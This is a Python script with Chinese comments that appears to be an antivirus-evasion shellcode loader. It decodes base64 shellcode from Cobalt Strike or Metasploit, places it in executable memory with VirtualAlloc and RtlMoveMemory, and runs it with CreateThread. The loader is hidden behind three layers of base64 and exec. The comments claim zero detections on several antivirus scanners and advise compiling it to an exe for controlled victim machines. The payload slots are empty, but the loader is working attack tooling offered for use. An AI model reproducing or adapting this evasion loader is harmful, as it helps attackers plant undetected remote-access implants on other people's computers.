import base64,ctypes

# 此脚本采用三重base64编码方式
# 测试软件:火绒杀毒通过，微步在线0报毒，virus total 0报毒，virscan 0报毒。免杀率100% (测试时间2023年3月2日16:47:48)
# 如果被控端没有python环境，请把此脚本编译成exe文件再执行

# 一重编码(cd部分)
# cd待填入的值是由cs或者msf生成的playload.c里面的shellcode经过base64编码的值
'''cd=''
cd=base64.b64decode(cd)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(cd), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(cd), len(cd))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)'''


# 二重编码
# zx待填入的值是一重编码三引号之间所有代码的base64的值
'''zx=''
zx2=base64.b64decode(zx)
exec(zx2)'''


# 三重编码
# zx3填入的是二重编码部分三引号之间所有的代码的base64
# 执行上线
if __name__ == '__main__':
    zx3=''
    zx3=base64.b64decode(zx3)
    exec(zx3)





